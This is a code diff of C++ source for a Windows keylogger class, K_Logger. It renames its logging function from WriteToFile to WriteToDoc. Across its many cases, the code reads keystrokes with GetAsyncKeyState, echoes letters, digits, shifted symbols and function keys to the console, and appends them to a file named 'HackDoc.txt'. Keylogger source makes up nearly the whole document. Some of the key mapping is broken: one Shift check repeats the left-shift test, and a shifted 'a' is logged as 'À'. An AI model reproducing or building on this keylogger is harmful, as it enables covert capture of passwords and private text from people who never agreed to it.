@@ -15,7 +15,7 @@
 
 
 
-void K_Logger::WriteToFile(LPCSTR text)
+void K_Logger::WriteToDoc(LPCSTR text)
 {
 	std::ofstream doc_to;
 	doc_to.open("HackDoc.txt", std::fstream::app);
@@ -31,12 +31,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << ")";
-				WriteToFile(")");
+				WriteToDoc(")");
 			}
 			else
 			{
 				std::cout << "0";
-				WriteToFile("0");
+				WriteToDoc("0");
 			}
 			break;
 
@@ -44,12 +44,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_LSHIFT))
 			{
 				std::cout << "!";
-				WriteToFile("!");
+				WriteToDoc("!");
 			}
 			else
 			{
 				std::cout << "1";
-				WriteToFile("1");
+				WriteToDoc("1");
 			}
 			break;
 
@@ -57,12 +57,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "@";
-				WriteToFile("@");
+				WriteToDoc("@");
 			}
 			else
 			{
 				std::cout << "2";
-				WriteToFile("2");
+				WriteToDoc("2");
 			}
 			break;
 
@@ -70,12 +70,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "#";
-				WriteToFile("#");
+				WriteToDoc("#");
 			}
 			else
 			{
 				std::cout << "3";
-				WriteToFile("3");
+				WriteToDoc("3");
 			}
 			break;
 
@@ -83,12 +83,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "$";
-				WriteToFile("$");
+				WriteToDoc("$");
 			}
 			else
 			{
 				std::cout << "4";
-				WriteToFile("4");
+				WriteToDoc("4");
 			}
 			break;
 
@@ -96,12 +96,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "%";
-				WriteToFile("%");
+				WriteToDoc("%");
 			}
 			else
 			{
 				std::cout << "5";
-				WriteToFile("5");
+				WriteToDoc("5");
 			}
 			break;
 
@@ -109,12 +109,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "^";
-				WriteToFile("^");
+				WriteToDoc("^");
 			}
 			else
 			{
 				std::cout << "6";
-				WriteToFile("6");
+				WriteToDoc("6");
 			}
 			break;
 
@@ -122,12 +122,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "&";
-				WriteToFile("&");
+				WriteToDoc("&");
 			}
 			else
 			{
 				std::cout << "7";
-				WriteToFile("7");
+				WriteToDoc("7");
 			}
 			break;
 
@@ -135,12 +135,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "*";
-				WriteToFile("*");
+				WriteToDoc("*");
 			}
 			else
 			{
 				std::cout << "8";
-				WriteToFile("8");
+				WriteToDoc("8");
 			}
 			break;
 
@@ -148,12 +148,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "(";
-				WriteToFile("(");
+				WriteToDoc("(");
 			}
 			else
 			{
 				std::cout << "9";
-				WriteToFile("9");
+				WriteToDoc("9");
 			}
 			break;
 
@@ -161,12 +161,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "À";
-				WriteToFile("À");
+				WriteToDoc("À");
 			}
 			else
 			{
 				std::cout << "a";
-				WriteToFile("a");
+				WriteToDoc("a");
 			}
 			break;
 
@@ -174,12 +174,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "B";
-				WriteToFile("B");
+				WriteToDoc("B");
 			}
 			else
 			{
 				std::cout << "b";
-				WriteToFile("b");
+				WriteToDoc("b");
 			}
 			break;
 
@@ -187,12 +187,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "C";
-				WriteToFile("C");
+				WriteToDoc("C");
 			}
 			else
 			{
 				std::cout << "c";
-				WriteToFile("c");
+				WriteToDoc("c");
 			}
 			break;
 
@@ -200,12 +200,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "D";
-				WriteToFile("D");
+				WriteToDoc("D");
 			}
 			else
 			{
 				std::cout << "d";
-				WriteToFile("d");
+				WriteToDoc("d");
 			}
 			break;
 
@@ -213,12 +213,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "E";
-				WriteToFile("E");
+				WriteToDoc("E");
 			}
 			else
 			{
 				std::cout << "e";
-				WriteToFile("e");
+				WriteToDoc("e");
 			}
 			break;
 
@@ -226,12 +226,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "F";
-				WriteToFile("F");
+				WriteToDoc("F");
 			}
 			else
 			{
 				std::cout << "f";
-				WriteToFile("f");
+				WriteToDoc("f");
 			}
 			break;
 
@@ -239,12 +239,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "G";
-				WriteToFile("G");
+				WriteToDoc("G");
 			}
 			else
 			{
 				std::cout << "g";
-				WriteToFile("g");
+				WriteToDoc("g");
 			}
 			break;
 
@@ -252,12 +252,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "H";
-				WriteToFile("H");
+				WriteToDoc("H");
 			}
 			else
 			{
 				std::cout << "h";
-				WriteToFile("h");
+				WriteToDoc("h");
 			}
 			break;
 
@@ -265,12 +265,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "I";
-				WriteToFile("I");
+				WriteToDoc("I");
 			}
 			else
 			{
 				std::cout << "i";
-				WriteToFile("i");
+				WriteToDoc("i");
 			}
 			break;
 
@@ -278,12 +278,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "J";
-				WriteToFile("J");
+				WriteToDoc("J");
 			}
 			else
 			{
 				std::cout << "j";
-				WriteToFile("j");
+				WriteToDoc("j");
 			}
 			break;
 
@@ -292,12 +292,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "K";
-				WriteToFile("K");
+				WriteToDoc("K");
 			}
 			else
 			{
 				std::cout << "k";
-				WriteToFile("k");
+				WriteToDoc("k");
 			}
 			break;
 
@@ -306,12 +306,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "L";
-				WriteToFile("L");
+				WriteToDoc("L");
 			}
 			else
 			{
 				std::cout << "l";
-				WriteToFile("l");
+				WriteToDoc("l");
 			}
 			break;
 
@@ -319,12 +319,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "M";
-				WriteToFile("M");
+				WriteToDoc("M");
 			}
 			else
 			{
 				std::cout << "m";
-				WriteToFile("m");
+				WriteToDoc("m");
 			}
 			break;
 
@@ -333,12 +333,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "N";
-				WriteToFile("N");
+				WriteToDoc("N");
 			}
 			else
 			{
 				std::cout << "n";
-				WriteToFile("n");
+				WriteToDoc("n");
 			}
 			break;
 
@@ -346,12 +346,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "O";
-				WriteToFile("O");
+				WriteToDoc("O");
 			}
 			else
 			{
 				std::cout << "o";
-				WriteToFile("o");
+				WriteToDoc("o");
 			}
 			break;
 
@@ -359,12 +359,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "P";
-				WriteToFile("P");
+				WriteToDoc("P");
 			}
 			else
 			{
 				std::cout << "p";
-				WriteToFile("p");
+				WriteToDoc("p");
 			}
 			break;
 
@@ -372,12 +372,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "Q";
-				WriteToFile("Q");
+				WriteToDoc("Q");
 			}
 			else
 			{
 				std::cout << "q";
-				WriteToFile("q");
+				WriteToDoc("q");
 			}
 			break;
 
@@ -385,12 +385,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "R";
-				WriteToFile("R");
+				WriteToDoc("R");
 			}
 			else
 			{
 				std::cout << "r";
-				WriteToFile("r");
+				WriteToDoc("r");
 			}
 			break;
 
@@ -398,12 +398,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "S";
-				WriteToFile("S");
+				WriteToDoc("S");
 			}
 			else
 			{
 				std::cout << "s";
-				WriteToFile("s");
+				WriteToDoc("s");
 			}
 			break;
 
@@ -411,12 +411,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "T";
-				WriteToFile("T");
+				WriteToDoc("T");
 			}
 			else
 			{
 				std::cout << "t";
-				WriteToFile("t");
+				WriteToDoc("t");
 			}
 			break;
 
@@ -424,12 +424,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "U";
-				WriteToFile("U");
+				WriteToDoc("U");
 			}
 			else
 			{
 				std::cout << "u";
-				WriteToFile("u");
+				WriteToDoc("u");
 			}
 			break;
 
@@ -437,12 +437,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "V";
-				WriteToFile("V");
+				WriteToDoc("V");
 			}
 			else
 			{
 				std::cout << "v";
-				WriteToFile("v");
+				WriteToDoc("v");
 			}
 			break;
 
@@ -450,12 +450,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "W";
-				WriteToFile("W");
+				WriteToDoc("W");
 			}
 			else
 			{
 				std::cout << "w";
-				WriteToFile("w");
+				WriteToDoc("w");
 			}
 			break;
 
@@ -463,12 +463,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "X";
-				WriteToFile("X");
+				WriteToDoc("X");
 			}
 			else
 			{
 				std::cout << "x";
-				WriteToFile("x");
+				WriteToDoc("x");
 			}
 			break;
 
@@ -476,12 +476,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "Y";
-				WriteToFile("Y");
+				WriteToDoc("Y");
 			}
 			else
 			{
 				std::cout << "y";
-				WriteToFile("y");
+				WriteToDoc("y");
 			}
 			break;
 
@@ -489,12 +489,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "Z";
-				WriteToFile("Z");
+				WriteToDoc("Z");
 			}
 			else
 			{
 				std::cout << "z";
-				WriteToFile("z");
+				WriteToDoc("z");
 			}
 			break;
 
@@ -503,82 +503,82 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 		case VK_F1:
 			std::cout << "  *F1*  ";
-			WriteToFile("  *F1*  ");
+			WriteToDoc("  *F1*  ");
 			break;
 
 		case VK_F2:
 			std::cout << "  *F2*  ";
-			WriteToFile("  *F2*  ");
+			WriteToDoc("  *F2*  ");
 			break;
 
 		case VK_F3:
 			std::cout << "  *F3*  ";
-			WriteToFile("  *F3*  ");
+			WriteToDoc("  *F3*  ");
 			break;
 
 		case VK_F4:
 			std::cout << "  *F4*  ";
-			WriteToFile("  *F4*  ");
+			WriteToDoc("  *F4*  ");
 			break;
 
 		case VK_F5:
 			std::cout << "  *F5*  ";
-			WriteToFile("  *F5*  ");
+			WriteToDoc("  *F5*  ");
 			break;
 
 		case VK_F6:
 			std::cout << "  *F6*  ";
-			WriteToFile("  *F6*  ");
+			WriteToDoc("  *F6*  ");
 			break;
 
 		case VK_F7:
 			std::cout << "  *F7*  ";
-			WriteToFile("  *F7*  ");
+			WriteToDoc("  *F7*  ");
 			break;
 
 		case VK_F8:
 			std::cout << "  *F8*  ";
-			WriteToFile("  *F8*  ");
+			WriteToDoc("  *F8*  ");
 			break;
 
 		case VK_F9:
 			std::cout << "  *F9*  ";
-			WriteToFile("  *F9*  ");
+			WriteToDoc("  *F9*  ");
 			break;
 
 		case VK_F10:
 			std::cout << "  *F10*  ";
-			WriteToFile("  *F10*  ");
+			WriteToDoc("  *F10*  ");
 			break;
 
 		case VK_F11:
 			std::cout << "  *F11*  ";
-			WriteToFile("  *F11*  ");
+			WriteToDoc("  *F11*  ");
 			break;
 
 		case VK_F12:
 			std::cout << "  *F12*  ";
-			WriteToFile("  *F12*  ");
+			WriteToDoc("  *F12*  ");
 			break;
 
 		case VK_END:
 			std::cout << "  *END*  ";
-			WriteToFile("  *END*  ");
+			WriteToDoc("  *END*  ");
 			break;
 
 		case VK_HOME:
 			std::cout << "  *HOME*  ";
-			WriteToFile("  *HOME*  ");
+			WriteToDoc("  *HOME*  ");
 			break;
 
 		case VK_NUMLOCK:
 			std::cout << "  *Num_Lock*  ";
-			WriteToFile("  *Num_Lock*  ");
+			WriteToDoc("  *Num_Lock*  ");
 			break;
 
 		case VK_RWIN:
 			std::cout << "  *Right_Windows*  ";
-			WriteToFile("  *Right_Windows*  ");
+			WriteToDoc("  *Right_Windows*  ");
 			break;
 
 
